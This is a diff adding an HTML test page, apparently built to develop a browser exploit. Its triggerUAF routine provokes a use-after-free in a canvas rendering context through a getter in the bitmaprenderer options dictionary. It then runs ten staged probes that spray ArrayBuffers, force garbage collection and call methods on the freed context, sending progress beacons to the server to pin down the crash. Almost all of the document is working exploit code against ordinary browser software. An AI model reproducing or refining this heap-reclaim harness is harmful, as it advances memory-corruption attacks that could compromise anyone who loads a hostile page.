@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V551</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V551-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V551-crash-isolate');
+
+// T1: triggerUAF + NO operations at all — does just having the dangling ref crash?
+(function T1(){
+  b('T1-PRE','about to triggerUAF');
+  var ctx=triggerUAF();
+  b('T1-POST','triggerUAF returned, ctx='+(ctx?'ok':'null'));
+  // Don't touch ctx at all
+  b('T1-DONE','no operations on dangling ref');
+})();
+
+// T2: triggerUAF + single AB(768) — does allocation crash?
+(function T2(){
+  b('T2-PRE','about to triggerUAF');
+  var ctx=triggerUAF();
+  b('T2-UAF','ok');
+  var ab=new ArrayBuffer(768);
+  b('T2-AB','single AB(768) allocated');
+  // Don't touch ctx
+  b('T2-DONE','no operations after AB');
+})();
+
+// T3: triggerUAF + 50 AB(768) — does mass allocation crash?
+(function T3(){
+  b('T3-PRE','about to triggerUAF');
+  var ctx=triggerUAF();
+  b('T3-UAF','ok');
+  var abs=[];
+  for(var i=0;i<50;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T3-AB','50 AB(768) allocated');
+  // Don't touch ctx
+  b('T3-DONE','no operations after spray');
+})();
+
+// T4: triggerUAF + 50 AB(768) + force GC — does GC crash?
+(function T4(){
+  b('T4-PRE','about to triggerUAF + AB + GC');
+  var ctx=triggerUAF();
+  b('T4-UAF','ok');
+  var abs=[];
+  for(var i=0;i<50;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T4-AB','50 ABs allocated');
+  // Force GC via allocation pressure
+  var junk=[];
+  for(var g=0;g<20000;g++)junk.push({x:g,y:g*2});
+  junk=null;
+  for(var g=0;g<5000;g++){var t=new ArrayBuffer(1024);t=null}
+  b('T4-GC','GC pressure applied, no crash');
+  b('T4-DONE','GC safe after AB spray');
+})();
+
+// T5: triggerUAF + 50 AB(768) + save() — THE CRITICAL TEST
+(function T5(){
+  b('T5-PRE','about to triggerUAF + AB + save');
+  var ctx=triggerUAF();
+  b('T5-UAF','ok');
+  var abs=[];
+  for(var i=0;i<50;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T5-AB','50 ABs allocated');
+  b('T5-PRESAVE','about to call save()');
+  try{
+    ctx.save();
+    b('T5-SAVE','save() returned OK!');
+  }catch(e){b('T5-SAVE-ERR',e.message)}
+  b('T5-DONE','completed');
+})();
+
+// T6: triggerUAF + NO reclaim + save() — save on raw freed memory
+(function T6(){
+  b('T6-PRE','about to triggerUAF + save (no reclaim)');
+  var ctx=triggerUAF();
+  b('T6-UAF','ok');
+  b('T6-PRESAVE','about to call save() on freed memory');
+  try{
+    ctx.save();
+    b('T6-SAVE','save() on freed memory returned OK!');
+  }catch(e){b('T6-SAVE-ERR',e.message)}
+  b('T6-DONE','completed');
+})();
+
+// T7: triggerUAF + 50 AB(768) + lineWidth READ — stateStack.last() through null
+(function T7(){
+  b('T7-PRE','about to triggerUAF + AB + lineWidth');
+  var ctx=triggerUAF();
+  b('T7-UAF','ok');
+  var abs=[];
+  for(var i=0;i<50;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T7-AB','50 ABs allocated');
+  b('T7-PRELW','about to read lineWidth');
+  try{
+    var lw=ctx.lineWidth;
+    b('T7-LW','lineWidth='+lw);
+  }catch(e){b('T7-LW-ERR',e.message)}
+  b('T7-DONE','completed');
+})();
+
+// T8: triggerUAF + NO reclaim + lineWidth READ — stateStack.last() on stale data
+(function T8(){
+  b('T8-PRE','triggerUAF + lineWidth (no reclaim)');
+  var ctx=triggerUAF();
+  b('T8-UAF','ok');
+  b('T8-PRELW','about to read lineWidth on freed memory');
+  try{
+    var lw=ctx.lineWidth;
+    b('T8-LW','lineWidth='+lw);
+  }catch(e){b('T8-LW-ERR',e.message)}
+  b('T8-DONE','completed');
+})();
+
+// T9: triggerUAF + 50 AB(768) + getContextAttributes (reads inline settings, no stateStack)
+(function T9(){
+  b('T9-PRE','triggerUAF + AB + getContextAttributes');
+  var ctx=triggerUAF();
+  b('T9-UAF','ok');
+  var abs=[];
+  for(var i=0;i<50;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T9-AB','50 ABs allocated');
+  b('T9-PREATTR','about to call getContextAttributes');
+  try{
+    var attr=ctx.getContextAttributes();
+    b('T9-ATTR','attrs='+JSON.stringify(attr));
+  }catch(e){b('T9-ATTR-ERR',e.message)}
+  b('T9-DONE','completed');
+})();
+
+// T10: triggerUAF + AB + read canvas property (references m_canvas)
+(function T10(){
+  b('T10-PRE','triggerUAF + AB + canvas prop');
+  var ctx=triggerUAF();
+  b('T10-UAF','ok');
+  var abs=[];
+  for(var i=0;i<50;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T10-AB','50 ABs allocated');
+  b('T10-PRECANVAS','about to read ctx.canvas');
+  try{
+    var c=ctx.canvas;
+    b('T10-CANVAS','canvas='+(c?c.tagName:'null'));
+  }catch(e){b('T10-CANVAS-ERR',e.message)}
+  b('T10-DONE','completed');
+})();
+
+b('DONE','V551-all-complete');
+</script>
+</body></html>
